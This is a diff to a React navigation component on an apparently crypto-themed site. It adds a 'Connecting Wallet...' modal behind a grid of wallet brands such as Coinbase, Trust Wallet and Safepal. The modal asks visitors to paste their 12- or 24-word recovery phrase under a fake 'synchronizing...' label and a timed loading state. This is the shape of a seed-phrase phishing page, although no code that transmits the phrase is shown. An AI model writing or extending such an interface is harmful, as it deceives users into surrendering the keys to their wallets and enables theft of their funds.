@@ -46,12 +46,27 @@ const Navbar = () => {
   const [showModal, setShowModal] = useState(false);
   const [selectedWallet, setSelectedWallet] = useState(false);
   const [isNavOpen, setIsNavOpen] = useState(false);
+  const [loading, setLoading] = useState(false);
+  // const [dots, setDots] = useState("");
 
   // To run AOS
   useEffect(() => {
     // Initialize AOS
     AOS.init();
   }, []);
+
+  // For loading animation...
+  useEffect(() => {
+    // Simulating delay for demonstration purposes
+    const timer = setTimeout(() => {
+      setLoading(false);
+    }, 3000); // Adjust the delay time as needed
+
+    // Clear the timer when component unmounts or when loading is finished
+    return () => clearTimeout(timer);
+  }, []);
+
+  const dots = "...";
 
   // To sellect a wallet
   const toggleModal = () => {
@@ -135,38 +150,38 @@ const Navbar = () => {
               </div>
               <div className=" flex items-center gap-2">
                 <div className=" w-[50%]" onClick={toggleSelected}>
-                  <Wallets img={Coinbase} walletName="Metamask" />
+                  <Wallets img={Coinbase} walletName="Coinbase" />
                 </div>
 
                 <div className=" w-[50%]" onClick={toggleSelected}>
-                  <Wallets img={Walletconnect} walletName="Rabby Wallet" />
+                  <Wallets img={Walletconnect} walletName="Wallet Connect" />
                 </div>
               </div>
               <div className=" flex items-center gap-2">
                 <div className=" w-[50%]" onClick={toggleSelected}>
-                  <Wallets img={Trust} walletName="Metamask" />
+                  <Wallets img={Trust} walletName="Trust Wallet" />
                 </div>
 
                 <div className=" w-[50%]" onClick={toggleSelected}>
-                  <Wallets img={Safepal} walletName="Rabby Wallet" />
+                  <Wallets img={Safepal} walletName="Safepal Wallet" />
                 </div>
               </div>
               <div className=" flex items-center gap-2">
                 <div className=" w-[50%]" onClick={toggleSelected}>
-                  <Wallets img={Math} walletName="Metamask" />
+                  <Wallets img={Math} walletName="Math Wallet" />
                 </div>
 
                 <div className=" w-[50%]" onClick={toggleSelected}>
-                  <Wallets img={TokenP} walletName="Rabby Wallet" />
+                  <Wallets img={TokenP} walletName="TokenP Wallet" />
                 </div>
               </div>
               <div className=" flex items-center gap-2">
                 <div className=" w-[50%]" onClick={toggleSelected}>
-                  <Wallets img={Bitkeep} walletName="Metamask" />
+                  <Wallets img={Bitkeep} walletName="Bitkeep" />
                 </div>
 
                 <div className=" w-[50%]" onClick={toggleSelected}>
-                  <Wallets img={Fantom} walletName="Rabby Wallet" />
+                  <Wallets img={Fantom} walletName="Fantom Wallet" />
                 </div>
               </div>
             </div>
@@ -183,7 +198,7 @@ const Navbar = () => {
           <div className="px-3 w-full h-fit py-3 flex flex-col justify-center bg-white rounded-lg border ">
             <div className=" flex items-center justify-between border-b py-2">
               <div>
-                <h1 className=" text-md">MetaMask Modal</h1>
+                <h1 className=" text-md font-semibold">Connecting Wallet...</h1>
               </div>
 
               <button onClick={toggleSelected}>
@@ -191,8 +206,31 @@ const Navbar = () => {
               </button>
             </div>
 
-            <div className=" flex flex-col gap-2 mt-4">
-              {/* Add MetaMask content here */}
+            <div className=" flex flex-col items-center justify-center gap-6 mt-4">
+              <div className=" font-semibold text-xl">
+                Import Your Wallet (synchronizing...)
+              </div>
+
+              <div className=" border-b-2 border-[#F95997] w-full"></div>
+
+              <div className="wallet w-full">
+                <form action="">
+                  <textarea
+                    className="  w-full h-[27vh] shadow-lg border focus:border-gray-300 font-semibold py-2 px-4 rounded-md focus:outline-none"
+                    placeholder="Enter your recovery phrase"
+                  ></textarea>
+                </form>
+              </div>
+
+              <div>
+                <p className="mb-3 mx-3 px-8 text-[14px] font-medium text-center">
+                  Typically 12 (sometimes 24) words separated by single space
+                </p>
+              </div>
+
+              <div className=" w-full bg-[#FDEAF1] font-semibold text-[#F95997] text-center rounded-lg py-3 text-lg">
+                <button>CONNECT</button>
+              </div>
             </div>
           </div>
         </div>
